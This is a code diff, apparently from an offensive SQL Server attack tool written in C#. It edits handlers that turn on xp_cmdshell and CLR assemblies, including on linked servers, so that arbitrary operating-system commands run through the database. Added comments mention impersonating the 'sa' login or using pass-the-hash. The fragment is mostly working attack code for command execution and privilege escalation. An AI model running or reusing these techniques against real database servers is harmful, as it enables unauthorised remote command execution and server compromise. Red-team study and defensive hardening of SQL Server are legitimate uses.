@@ -451,15 +451,6 @@ Examples:
             /////////////////////////////////////////////////////////////////////////////////////////////////////
             // Code Execution
 
-            else if (string.Equals(command, "Enable-CLR", StringComparison.CurrentCultureIgnoreCase))
-            {
-                string query = executeQuery("use msdb;EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'clr enabled',1;RECONFIGURE;EXEC sp_configure 'clr strict security', 0;RECONFIGURE;", con);
-                Console.WriteLine("[+] Enable-CLR: ");
-                Console.WriteLine($"{query}");
-            }
-
-
-
 
             else if (string.Equals(command, "Enable-Cmdshell", StringComparison.CurrentCultureIgnoreCase))
             {
@@ -481,13 +472,13 @@ Examples:
                 }
                 else
                 {
-                    //string query = executeQuery($"EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT [{Config.linkedinstance}];", con); // RPC fail
-                    //query = executeQuery($"EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [{Config.linkedinstance}];", con);
-                    //query = executeQuery($"EXEC ('xp_cmdshell ''whoami'';') AT [{Config.linkedinstance}];", con);
+                    string query = executeQuery($"EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT [{Config.linkedinstance}];", con); // if RPC error, enable RPC on remote server
+                    query = executeQuery($"EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [{Config.linkedinstance}];", con);
+                    query = executeQuery($"EXEC ('xp_cmdshell ''{Config.command}'';') AT [{Config.linkedinstance}];", con);
 
-                    string query = executeQuery($"SELECT * FROM OPENQUERY([{Config.linkedinstance}], 'sp_configure ''show advanced options'', 1; reconfigure;');", con); // metadata error
-                    query = executeQuery($"SELECT * FROM OPENQUERY([{Config.linkedinstance}], 'sp_configure ''xp_cmdshell'', 1; reconfigure;');", con);
-                    query = executeQuery($"SELECT * FROM OPENQUERY([{Config.linkedinstance}], 'exec xp_cmdshell ''whoami'' WITH RESULT SETS ((output VARCHAR(MAX)))');", con);
+                    //string query = executeQuery($"SELECT * FROM OPENQUERY([{Config.linkedinstance}], 'sp_configure ''show advanced options'', 1; reconfigure;');", con); // metadata error
+                    //query = executeQuery($"SELECT * FROM OPENQUERY([{Config.linkedinstance}], 'sp_configure ''xp_cmdshell'', 1; reconfigure;');", con);
+                    //query = executeQuery($"SELECT * FROM OPENQUERY([{Config.linkedinstance}], 'exec xp_cmdshell ''whoami'' WITH RESULT SETS ((output VARCHAR(MAX)))');", con);
                     Console.WriteLine("[*] Enable-LinkedCmdshell: ");
                     Console.WriteLine($"{query}");
                 }
@@ -557,6 +548,7 @@ Examples:
             }
 
 
+            // EXECUTE AS LOGIN = 'sa' - need to remove this and add a Execue-AsUser function, or you can pth before
             else if (string.Equals(command, "Clear-CLRAsm", StringComparison.CurrentCultureIgnoreCase))
             {
                 string query = executeQuery($"EXECUTE AS LOGIN = 'sa'; use msdb; DROP PROCEDURE cmdExec; DROP ASSEMBLY custom_asm", con);
@@ -564,7 +556,7 @@ Examples:
                 Console.WriteLine($"{query}");
             }
 
-
+            // EXECUTE AS LOGIN = 'sa' - need to remove this and add a Execue-AsUser function, or you can pth before
             else if (string.Equals(command, "Invoke-CLRAsm", StringComparison.CurrentCultureIgnoreCase))
             {
                 string query = executeQuery($"EXECUTE AS LOGIN = 'sa'; use msdb;EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'clr enabled',1;RECONFIGURE;EXEC sp_configure 'clr strict security', 0;RECONFIGURE;", con);
